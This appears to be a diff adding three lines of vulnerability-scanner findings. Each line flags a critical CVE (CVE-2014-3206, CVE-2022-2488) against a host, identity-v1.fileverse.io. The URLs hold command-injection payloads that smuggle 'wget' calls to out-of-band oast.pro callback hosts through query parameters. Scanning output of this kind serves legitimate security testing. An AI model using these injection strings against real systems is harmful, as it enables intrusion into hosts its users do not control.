@@ -1,0 +1,3 @@
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/localJob.php?session=fail;wget+http://da09rp2ai4kjlg9m3jpgebd7b8mydqxt3.oast.pro;
+[CVE-2014-3206] [http] [critical] https://identity-v1.fileverse.io/backupmgt/pre_connect_check.php?auth_name=fail;wget+http://da09rp2ai4kjlg9m3jpgxias5r6g4zi4r.oast.pro;
+[CVE-2022-2488] [http] [critical] https://identity-v1.fileverse.io/cgi-bin/touchlist_sync.cgi?IP=;wget+http://da09rp2ai4kjlg9m3jpgissdqc5gqerdg.oast.pro;
